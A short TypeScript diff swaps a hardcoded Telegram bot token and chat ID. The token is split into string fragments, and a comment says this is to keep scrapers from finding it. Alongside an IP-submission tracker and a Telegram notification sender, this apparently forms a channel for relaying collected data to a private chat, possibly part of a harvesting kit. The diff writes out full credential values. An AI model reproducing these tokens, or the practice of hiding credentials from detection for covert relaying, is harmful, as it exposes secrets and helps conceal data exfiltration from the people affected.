@@ -18,17 +18,18 @@ export async function markIPSubmitted(ip: string): Promise<void> {
 // This makes it harder for scrapers to find the token while keeping it functional
 function getTelegramToken(): string {
   // Split into parts to avoid easy scraping
-  const p1 = "7676"
-  const p2 = "418790"
-  const p3 = ":AAHrnRY1wp-4Ae7t7IjUMi1pCLUAMLKIRr4"
+  const p1 = "7533"
+  const p2 = "852767"
+  const p3 = ":AAEirrpoXV4mBIaRZMvyLV1MgxNPBrPDDO0"
 
   // Combine at runtime
   return p1 + p2 + p3
 }
 
+// Update the getTelegramChatId function to use the new chat ID
 function getTelegramChatId(): string {
   // Store without the negative sign and add it at runtime
-  return "-4738990919"
+  return "-4684846353"
 }
 
 // Core function to send Telegram notifications
